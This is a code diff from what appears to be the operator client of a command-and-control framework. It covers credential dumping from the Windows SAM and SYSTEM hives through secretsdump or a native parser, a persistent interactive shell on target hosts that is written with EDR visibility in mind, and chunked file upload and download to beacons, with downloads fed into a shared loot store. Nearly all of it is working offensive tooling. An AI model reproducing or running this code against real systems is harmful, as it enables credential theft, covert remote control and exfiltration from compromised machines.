+        with _CHAT_OUTPUT_LOCK:
+            is_tty = _COLOR and sys.stdout.isatty()
+            if is_tty:
+                try:
+                    sys.stdout.write('\r\033[K')
+                    sys.stdout.flush()
+                except Exception:
+                    pass
+
+            if err is not None:
+                print(f"{CLR['red']}✗ {verb}{CLR['reset']}  "
+                      f"{CLR['dim']}(#{bid}, {elapsed:.2f}s)"
+                      f"{CLR['reset']}")
+                for line in str(err).splitlines():
+                    print(f"  {CLR['red']}{line}{CLR['reset']}")
+                return
+
             try:
-                sys.stdout.write('\r\033[K')
-                sys.stdout.flush()
+                out = _b64.b64decode(output_b64 or '')
             except Exception:
-                pass
+                out = b''
 
-        if err is not None:
-            print(f"{CLR['red']}✗ {verb}{CLR['reset']}  "
-                  f"{CLR['dim']}(#{bid}, {elapsed:.2f}s)"
-                  f"{CLR['reset']}")
-            for line in str(err).splitlines():
-                print(f"  {CLR['red']}{line}{CLR['reset']}")
-            return
+            text = out.decode('utf-8', errors='replace').rstrip()
+            nbytes = len(out)
 
-        try:
-            out = _b64.b64decode(output_b64 or '')
-        except Exception:
-            out = b''
+            exit_note = f"  exit {code}" if code else ""
+            size_note = ""
+            if nbytes > 1024:
+                size_note = f"  {_human_bytes(nbytes)}"
 
-        text = out.decode('utf-8', errors='replace').rstrip()
-        nbytes = len(out)
+            print(f"{CLR['green']}✓{CLR['reset']} "
+                  f"{CLR['cyan']}{verb}{CLR['reset']}"
+                  f"{CLR['dim']}  #{bid}  {elapsed:.2f}s"
+                  f"{size_note}{exit_note}{CLR['reset']}")
 
-        exit_note = f"  exit {code}" if code else ""
-        size_note = ""
-        if nbytes > 1024:
-            size_note = f"  {_human_bytes(nbytes)}"
-
-        print(f"{CLR['green']}✓{CLR['reset']} "
-              f"{CLR['cyan']}{verb}{CLR['reset']}"
-              f"{CLR['dim']}  #{bid}  {elapsed:.2f}s"
-              f"{size_note}{exit_note}{CLR['reset']}")
-
-        if text:
-            _print_wrapped(text)
-        elif not code:
-            print(f"  {CLR['dim']}(no output){CLR['reset']}")
-
-    # ------------------------------------------------------------------
-    # Session export
-
-    # ------------------------------------------------------------------
-    # Credential collection
+            if text:
+                _print_wrapped(text)
+            elif not code:
+                print(f"  {CLR['dim']}(no output){CLR['reset']}")
 
     # ------------------------------------------------------------------
     # Credential collection
@@ -5311,7 +6242,8 @@ class Client:
             print(f"{c['red']}hashdump: SAM sha256 mismatch — "
                   f"refusing to write{c['reset']}")
             return
-        if hashlib.sha256(system).hexdigest() != env.get('system_sha256'):
+        if hashlib.sha256(system).hexdigest() != \
+                env.get('system_sha256'):
             print(f"{c['red']}hashdump: SYSTEM sha256 mismatch — "
                   f"refusing to write{c['reset']}")
             return
@@ -5330,62 +6262,47 @@ class Client:
               f"{_human_bytes(len(system))} SYSTEM to "
               f"{c['cyan']}{outdir}{c['reset']}")
 
-        secretsdump = shutil.which('secretsdump.py') \
-            or shutil.which('secretsdump')
-        if secretsdump is None:
+        # ---- First pass: try every secretsdump form ----
+        parsed = _run_secretsdump(sam_path, sys_path)
+
+        # ---- Fall back to the native parser ----
+        if parsed is None:
+            print(f"{c['yellow']}[*]{c['reset']} secretsdump is "
+                  f"not available — parsing the hives with the "
+                  f"native parser")
+            parsed = _run_native_parser(sam, system)
+
+        # ---- Both paths failed ----
+        if parsed is None:
             print()
-            print(f"  {c['dim']}secretsdump.py is not on PATH. "
-                  f"Recover the hashes with:{c['reset']}")
-            print(f"    {c['cyan']}secretsdump.py -sam "
-                  f"{sam_path} -system {sys_path} LOCAL{c['reset']}")
-            return
-
-        print(f"{c['cyan']}[*]{c['reset']} running secretsdump…")
-        try:
-            proc = subprocess.run(
-                [secretsdump, '-sam', sam_path,
-                 '-system', sys_path, 'LOCAL'],
-                capture_output=True, text=True, timeout=120)
-        except subprocess.TimeoutExpired:
-            print(f"{c['red']}secretsdump timed out{CLR['reset']}")
-            return
-        except OSError as exc:
-            print(f"{c['red']}secretsdump failed to start: "
-                  f"{exc}{CLR['reset']}")
-            return
-
-        if proc.returncode != 0:
-            print(f"{c['red']}secretsdump exited {proc.returncode}"
+            print(f"  {c['dim']}Neither secretsdump nor the "
+                  f"native parser recovered any hashes. The "
+                  f"hives were saved and are intact — recover "
+                  f"manually with:{c['reset']}")
+            print(f"    {c['cyan']}pip install impacket"
                   f"{c['reset']}")
-            for line in (proc.stderr or '').strip().splitlines():
-                print(f"  {c['red']}{line}{c['reset']}")
+            print(f"    {c['cyan']}impacket-secretsdump -sam "
+                  f"{sam_path} -system {sys_path} LOCAL"
+                  f"{c['reset']}")
             return
-
-        parsed = []
-        for line in proc.stdout.splitlines():
-            if line.startswith('[*]') or not line.strip():
-                continue
-            print(f"  {line}")
-            fields = line.split(':')
-            if len(fields) >= 4 and '\\' in fields[0]:
-                parsed.append(line)
 
         if not parsed:
-            print(f"{c['dim']}(no hashes in secretsdump output)"
-                  f"{c['reset']}")
+            print(f"  {c['dim']}hives parsed but no usable "
+                  f"hashes were found (empty or placeholder "
+                  f"hashes only){c['reset']}")
             return
 
         print()
-        print(f"  {c['dim']}{len(parsed)} credential(s) recovered. "
-              f"Add them to the vault:{c['reset']}")
-        for line in parsed:
-            domain_user, _rid, lm, ntlm = line.split(':')[:4]
-            if '\\' in domain_user:
-                dom, who = domain_user.split('\\', 1)
-            else:
-                dom, who = '', domain_user
-            hint = ntlm if ntlm and ntlm != \
-                'aad3b435b51404eeaad3b435b51404ee' else lm
+        print(f"  {c['dim']}{len(parsed)} credential(s) "
+              f"recovered. Add them to the vault:{c['reset']}")
+        for row in parsed:
+            dom = row.get('domain', '')
+            who = row.get('user', '')
+            ntlm = row.get('ntlm', '')
+            lm = row.get('lm', '')
+            hint = ntlm or lm
+            if not hint:
+                continue
             print(f"    {c['cyan']}creds add --user {who} "
                   f"--domain {dom} --kind ntlm --value {hint} "
                   f"--source {self.current_beacon}{c['reset']}")
@@ -5737,6 +6654,152 @@ class Client:
         out, err, code = self._send_and_wait(
             'migrate', list(parts[1:]), timeout=180)
         self._render_inline_result('migrate', out, err, code)
+
+    # ------------------------------------------------------------------
+    # Interactive shell
+
+    _SHELL_WARNING = (
+        "\n"
+        "  An interactive shell holds a /bin/sh (Linux) or cmd.exe\n"
+        "  (Windows) process open on the target for as long as this\n"
+        "  session runs. The shell is a long-lived child of the\n"
+        "  beacon, visible in the target's process tree, and every\n"
+        "  command typed here is a write() to its stdin.\n"
+        "\n"
+        "  This is the highest-artifact mode the framework offers.\n"
+        "  A defender watching process creation, parent-child\n"
+        "  relations, or the beacon's /proc/<pid>/task/*/children\n"
+        "  entry sees it on the first `ps`. Prefer `sh <cmd>` for\n"
+        "  one-off commands; reserve this for sessions where the\n"
+        "  state persistence (cd, env, shell variables) is worth\n"
+        "  the exposure.\n"
+    )
+
+    def _cmd_shell(self, parts):
+        """shell [start|stop|status|exec <cmd>]
+
+        An interactive shell on the target, held open across
+        check-ins. Entering interactive mode prompts before
+        dispatching `shell start` because a persistent child
+        process is high-signal on any host with EDR or a process
+        monitor.
+        """
+        c = CLR
+        sub = parts[1].lower() if len(parts) > 1 else ''
+
+        if sub == 'status':
+            out, err, _ = self._send_and_wait(
+                'shell', ['status'], timeout=30, quiet=True)
+            self._render_inline_result(
+                'shell status', out, err, None)
+            return
+
+        if sub == 'stop':
+            out, err, _ = self._send_and_wait(
+                'shell', ['stop'], timeout=15, quiet=True)
+            self._render_inline_result(
+                'shell stop', out, err, None)
+            return
+
+        if sub == 'exec':
+            if len(parts) < 3:
+                print(f"{c['red']}usage: shell exec <cmd...>"
+                      f"{c['reset']}")
+                return
+            cmd_line = ' '.join(parts[2:])
+            out, err, _ = self._send_and_wait(
+                'shell', ['exec', cmd_line], timeout=180,
+                quiet=True)
+            self._render_inline_result(
+                'shell exec', out, err, None)
+            return
+
+        if sub and sub != 'start':
+            print(f"{c['red']}usage: shell [start | stop | status "
+                  f"| exec <cmd>]{c['reset']}")
+            return
+
+        self._shell_interactive()
+
+    def _shell_interactive(self):
+        c = CLR
+
+        # Check current state first so a re-entry into the loop
+        # does not re-ask. If a shell is already running, the
+        # operator accepted the warning when they started it.
+        out, err, _ = self._send_and_wait(
+            'shell', ['status'], timeout=15, quiet=True)
+        if err is not None:
+            print(f"{c['red']}shell status check failed: {err}"
+                  f"{c['reset']}")
+            return
+        status_text = (out or b'').decode(
+            'utf-8', errors='replace')
+        already_running = 'not running' not in status_text
+
+        if not already_running:
+            print(self._SHELL_WARNING)
+            try:
+                ans = input(
+                    f"  {c['yellow']}Start an interactive shell? "
+                    f"[y/N]{c['reset']} ").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                print(f"{c['dim']}cancelled{c['reset']}")
+                return
+            if ans not in ('y', 'yes'):
+                print(f"{c['dim']}cancelled — no shell started"
+                      f"{c['reset']}")
+                return
+
+            out, err, _ = self._send_and_wait(
+                'shell', ['start'], timeout=30, quiet=True)
+            if err is not None:
+                print(f"{c['red']}shell start failed: {err}"
+                      f"{c['reset']}")
+                return
+            print(f"{c['green']}✓{c['reset']} "
+                  f"{(out or b'').decode('utf-8', errors='replace').strip()}")
+
+        print(f"{c['dim']}entering interactive shell. type "
+              f"`exit` or `.` on its own line to leave. the "
+              f"shell process stays running on the target; use "
+              f"`shell stop` to kill it.{c['reset']}")
+
+        try:
+            while True:
+                try:
+                    line = input(
+                        f"{c['magenta']}shell>{c['reset']} ")
+                except KeyboardInterrupt:
+                    print()
+                    continue
+                except EOFError:
+                    print()
+                    break
+
+                if not line.strip():
+                    continue
+                if line.strip() in ('exit', 'quit', '.'):
+                    break
+
+                out, err, _ = self._send_and_wait(
+                    'shell', ['exec', line], timeout=180,
+                    quiet=True)
+                if err is not None:
+                    print(f"{c['red']}{err}{c['reset']}")
+                    continue
+                text = (out or b'').decode(
+                    'utf-8', errors='replace').rstrip()
+                if text:
+                    _print_wrapped(text)
+                else:
+                    print(f"{c['dim']}(no output){c['reset']}")
+        finally:
+            print(f"{c['dim']}left interactive shell — the shell "
+                  f"process is still running on the target. "
+                  f"`shell stop` kills it; `shell` re-enters "
+                  f"without re-prompting.{c['reset']}")
 
     def _cmd_enablepriv(self, parts):
         """enablepriv — list, enable, or disable Windows token
@@ -8179,7 +9242,13 @@ code {{ background: var(--code-bg); border-radius: 3px;
     # Chunked upload
 
     def _cmd_upload(self, parts):
-        """upload <local_path> <remote_path>"""
+        """upload <local_path> <remote_path>
+
+        Starts a background transfer and returns immediately.
+        Chunk-level progress is suppressed — use `jobs` to check
+        status on demand. The completion line prints when the job
+        finishes, without blocking the prompt.
+        """
         if len(parts) < 3:
             print(f"{CLR['red']}usage: upload <local> <remote>"
                   f"{CLR['reset']}")
@@ -8195,88 +9264,34 @@ code {{ background: var(--code-bg); border-radius: 3px;
             print(f"{CLR['red']}file is empty{CLR['reset']}")
             return
 
+        print(f"{CLR['cyan']}[*]{CLR['reset']} hashing "
+              f"{local_path} ({_human_bytes(size)})…")
         h = hashlib.sha256()
         try:
             with open(local_path, 'rb') as fh:
-                for block in iter(lambda: fh.read(1024 * 1024), b''):
+                for block in iter(lambda: fh.read(1 << 20), b''):
                     h.update(block)
         except OSError as exc:
             print(f"{CLR['red']}read error: {exc}{CLR['reset']}")
             return
         local_hex = h.hexdigest()
 
-        print(f"{CLR['cyan']}[*]{CLR['reset']} uploading "
-              f"{local_path} ({size} bytes)")
-        print(f"{CLR['dim']}    local sha256: {local_hex}"
+        job = _TransferJob(
+            client=self, direction='upload',
+            local_path=local_path, remote_path=remote_path,
+            digest=local_hex, size=size,
+            beacon_id=self.current_beacon)
+        self._transfers[job.id] = job
+        print(f"{CLR['cyan']}▸{CLR['reset']} "
+              f"upload {CLR['bold']}{job.id}{CLR['reset']} "
+              f"started in background")
+        print(f"  {CLR['dim']}{local_path} → {remote_path}"
               f"{CLR['reset']}")
-
-        out, err, _ = self._send_and_wait(
-            'truncate', [remote_path], timeout=30, quiet=True)
-        if err:
-            print(f"{CLR['red']}truncate failed: {err}{CLR['reset']}")
-            return
-
-        low = max(4096, UPLOAD_CHUNK_SIZE // 2)
-        plan = []
-        remaining = size
-        while remaining > 0:
-            s = random.randint(low, UPLOAD_CHUNK_SIZE)
-            if s > remaining:
-                s = remaining
-            plan.append(s)
-            remaining -= s
-        total = len(plan)
-
-        started = time.time()
-        done = 0
-        try:
-            with open(local_path, 'rb') as fh:
-                for want in plan:
-                    block = fh.read(want)
-                    if not block:
-                        break
-                    b64 = _b64.b64encode(block).decode('ascii')
-                    out, err, _ = self._send_and_wait(
-                        'writechunk', [b64, remote_path],
-                        timeout=120, quiet=True)
-                    if err:
-                        print(f"\r{CLR['red']}chunk {done} failed: "
-                              f"{err}{CLR['reset']}")
-                        return
-                    done += 1
-                    width = 30
-                    filled = int(width * done / total)
-                    bar = '█' * filled + '░' * (width - filled)
-                    if sys.stdout.isatty():
-                        print(f"\r{CLR['cyan']}[{bar}] "
-                              f"{done}/{total} chunks{CLR['reset']}",
-                              end='', flush=True)
-        except OSError as exc:
-            print(f"\r{CLR['red']}read error: {exc}{CLR['reset']}")
-            return
-        if sys.stdout.isatty():
-            print()
-
-        # Step 3 — verify.
-        out, err, _ = self._send_and_wait(
-            'sha256file', [remote_path], timeout=120,
-            quiet=True)
-        if err:
-            print(f"{CLR['red']}verify failed: {err}{CLR['reset']}")
-            return
-        remote_hex = (out or b'').decode(
-            'ascii', errors='replace').strip()
-
-        elapsed = int(time.time() - started)
-        if remote_hex.lower() == local_hex.lower():
-            print(f"{CLR['green']}✓ upload complete — sha256 "
-                  f"verified ({elapsed}s){CLR['reset']}")
-            self._footer('upload', started, success=True)
-        else:
-            print(f"{CLR['red']}✗ sha256 mismatch{CLR['reset']}")
-            print(f"  local:  {local_hex}")
-            print(f"  remote: {remote_hex or '(unavailable)'}")
-            self._footer('upload', started, success=False)
+        print(f"  {CLR['dim']}{_human_bytes(size)}, "
+              f"sha256 {local_hex[:16]}…{CLR['reset']}")
+        print(f"  {CLR['dim']}`jobs` to check status; the prompt "
+              f"stays live{CLR['reset']}")
+        job.start()
 
     # ------------------------------------------------------------------
     # Chunked download
@@ -8284,10 +9299,10 @@ code {{ background: var(--code-bg); border-radius: 3px;
     def _cmd_download(self, parts):
         """download <remote_path> <local_path> [--no-loot]
 
+        Starts a background transfer and returns immediately.
         On a verified download, the file is also pushed to the
-        server-side loot store under its SHA-256 so another
-        operator can retrieve it. Pass --no-loot for a private
-        download that stays off the store.
+        server-side loot store under its SHA-256. Pass --no-loot
+        for a private download that stays off the store.
         """
         no_loot = False
         rest = []
@@ -8302,8 +9317,10 @@ code {{ background: var(--code-bg); border-radius: 3px;
             return
         remote_path, local_path = rest[0], rest[1]
 
+        print(f"{CLR['cyan']}[*]{CLR['reset']} fetching size of "
+              f"{remote_path}…")
         out, err, _ = self._send_and_wait(
-            'filesize', [remote_path], timeout=30, quiet=True)
+            'filesize', [remote_path], timeout=60, quiet=True)
         if err:
             print(f"{CLR['red']}filesize failed: {err}{CLR['reset']}")
             return
@@ -8326,78 +9343,26 @@ code {{ background: var(--code-bg); border-radius: 3px;
                       f"{CLR['reset']}")
             return
 
-        print(f"{CLR['cyan']}[*]{CLR['reset']} downloading "
-              f"{remote_path} ({total_bytes} bytes)")
-
-        low = max(4096, DOWNLOAD_CHUNK_SIZE // 2)
-        plan = []
-        cursor = 0
-        while cursor < total_bytes:
-            s = random.randint(low, DOWNLOAD_CHUNK_SIZE)
-            if cursor + s > total_bytes:
-                s = total_bytes - cursor
-            plan.append((cursor, s))
-            cursor += s
-        total = len(plan)
-
-        started = time.time()
-        done = 0
-        try:
-            with open(local_path, 'wb') as fh:
-                for offset, size in plan:
-                    out, err, _ = self._send_and_wait(
-                        'readchunk',
-                        [remote_path, str(offset), str(size)],
-                        timeout=120, quiet=True)
-                    if err:
-                        print(f"\r{CLR['red']}chunk {done} failed: "
-                              f"{err}{CLR['reset']}")
-                        return
-                    fh.write(out or b'')
-                    done += 1
-                    width = 30
-                    filled = int(width * done / total)
-                    bar = '█' * filled + '░' * (width - filled)
-                    print(f"\r{CLR['cyan']}[{bar}] {done}/{total} "
-                          f"chunks{CLR['reset']}", end='', flush=True)
-        except OSError as exc:
-            print(f"\r{CLR['red']}local write error: {exc}"
-                  f"{CLR['reset']}")
-            return
-        print()
-
-        h = hashlib.sha256()
-        try:
-            with open(local_path, 'rb') as fh:
-                for block in iter(lambda: fh.read(1024 * 1024), b''):
-                    h.update(block)
-        except OSError as exc:
-            print(f"{CLR['red']}local read error: {exc}{CLR['reset']}")
-            return
-        local_hex = h.hexdigest()
-
-        out, err, _ = self._send_and_wait(
-            'sha256file', [remote_path], timeout=120,
-            quiet=True)
-        if err:
-            print(f"{CLR['red']}verify failed: {err}{CLR['reset']}")
-            return
-        remote_hex = (out or b'').decode(
-            'ascii', errors='replace').strip()
-
-        elapsed = int(time.time() - started)
-        if remote_hex.lower() == local_hex.lower():
-            print(f"{CLR['green']}✓ download complete — sha256 "
-                  f"verified ({elapsed}s){CLR['reset']}")
-            self._footer('download', started, success=True)
-            if not no_loot:
-                self._loot_store_upload(
-                    local_path, remote_path, local_hex)
-        else:
-            print(f"{CLR['red']}✗ sha256 mismatch{CLR['reset']}")
-            print(f"  local:  {local_hex}")
-            print(f"  remote: {remote_hex or '(unavailable)'}")
-            self._footer('download', started, success=False)
+        job = _TransferJob(
+            client=self, direction='download',
+            local_path=local_path, remote_path=remote_path,
+            digest='', size=total_bytes,
+            beacon_id=self.current_beacon,
+            no_loot=no_loot)
+        self._transfers[job.id] = job
+        print(f"{CLR['cyan']}▸{CLR['reset']} "
+              f"download {CLR['bold']}{job.id}{CLR['reset']} "
+              f"started in background")
+        print(f"  {CLR['dim']}{remote_path} → {local_path}"
+              f"{CLR['reset']}")
+        print(f"  {CLR['dim']}{_human_bytes(total_bytes)}"
+              f"{CLR['reset']}")
+        if not no_loot:
+            print(f"  {CLR['dim']}on success, pushed to the loot "
+                  f"store automatically{CLR['reset']}")
+        print(f"  {CLR['dim']}`jobs` to check status; the prompt "
+              f"stays live{CLR['reset']}")
+        job.start()
 
     # ------------------------------------------------------------------
     # Loot auto-upload
@@ -8609,6 +9574,117 @@ code {{ background: var(--code-bg); border-radius: 3px;
         bid = self.current_beacon or '—'
         print(f"{c['dim']}[{ts}]  #{bid}  {verb}  {c['reset']}"
               f"{mark}  {c['dim']}{elapsed:.2f}s{c['reset']}")
+
+
+    # ------------------------------------------------------------------
+    # Background transfer completion + status
+
+    def _transfer_done(self, job, success, error=None):
+        """Called from a transfer worker when the job finishes.
+
+        Uses the same clear-then-print trick as the result poller
+        so the completion line does not land in the middle of
+        whatever the operator is typing. The lock is taken so
+        chat and task-result renderers do not interleave.
+
+        On a successful download and unless the operator passed
+        --no-loot, the file is pushed to the loot store from a
+        second background thread so the completion line is not
+        delayed by the push."""
+        elapsed = time.time() - job.started
+        c = CLR
+
+        with _CHAT_OUTPUT_LOCK:
+            is_tty = _COLOR and sys.stdout.isatty()
+            if is_tty:
+                try:
+                    sys.stdout.write('\r\033[K')
+                    sys.stdout.flush()
+                except Exception:
+                    pass
+
+            if success:
+                if job.direction == 'upload':
+                    target = job.remote_path
+                else:
+                    target = job.local_path
+                print(f"{c['green']}✓{c['reset']} "
+                      f"{c['cyan']}{job.direction}{c['reset']} "
+                      f"{c['bold']}{job.id}{c['reset']}  "
+                      f"{target}  "
+                      f"{c['dim']}({_human_bytes(job.size)}, "
+                      f"{elapsed:.1f}s){c['reset']}")
+                if job.direction == 'download' and job.digest:
+                    print(f"  {c['dim']}sha256: {job.digest}"
+                          f"{c['reset']}")
+            else:
+                print(f"{c['red']}✗ {job.direction}{c['reset']} "
+                      f"{c['bold']}{job.id}{c['reset']}  "
+                      f"{c['dim']}({elapsed:.1f}s){c['reset']}")
+                if error:
+                    for line in str(error).splitlines():
+                        print(f"  {c['red']}{line}{c['reset']}")
+
+        # Loot push runs after the completion line has printed,
+        # so a slow store does not hold the terminal.
+        if (success
+                and job.direction == 'download'
+                and job.digest
+                and not job.no_loot):
+            threading.Thread(
+                target=self._loot_store_upload,
+                args=(job.local_path, job.remote_path,
+                      job.digest),
+                name=f'loot-{job.id}',
+                daemon=True).start()
+
+    def _cmd_jobs(self, parts):
+        """jobs          list active transfers
+           jobs kill <id> cancel a transfer"""
+        c = CLR
+        if len(parts) > 1 and parts[1].lower() in (
+                'kill', 'cancel', 'stop'):
+            if len(parts) < 3:
+                print(f"{c['red']}usage: jobs kill <id>"
+                      f"{c['reset']}")
+                return
+            job = self._transfers.get(parts[2])
+            if job is None:
+                print(f"{c['red']}no such job: {parts[2]}"
+                      f"{c['reset']}")
+                return
+            job.cancel()
+            print(f"{c['green']}✓{c['reset']} cancel requested "
+                  f"for {c['cyan']}{parts[2]}{c['reset']}")
+            return
+
+        if not self._transfers:
+            print(f"  {c['dim']}(no background transfers)"
+                  f"{c['reset']}")
+            return
+
+        _header(f'TRANSFERS  ·  {len(self._transfers)}')
+        for jid, job in sorted(self._transfers.items()):
+            snap = job.snapshot()
+            pct = (100 * snap['done'] // snap['size']
+                   if snap['size'] else 0)
+            target = (snap['local'] if snap['direction'] == 'download'
+                      else snap['remote'])
+            other = (snap['remote'] if snap['direction'] == 'download'
+                     else snap['local'])
+            print(f"  {c['cyan']}{jid}{c['reset']}  "
+                  f"{snap['direction']:<8} "
+                  f"{target}")
+            print(f"    {c['dim']}{other}{c['reset']}")
+            print(f"    {c['dim']}{pct:>3}%  "
+                  f"{_human_bytes(snap['done'])} / "
+                  f"{_human_bytes(snap['size'])}  "
+                  f"{snap['chunks']}/{snap['total']} chunks  "
+                  f"{snap['elapsed']:.1f}s{c['reset']}")
+        print()
+        print(f"  {c['dim']}jobs kill <id>  to cancel a transfer"
+              f"{c['reset']}")
+        print()
 
     # ------------------------------------------------------------------
     # In-memory script execution
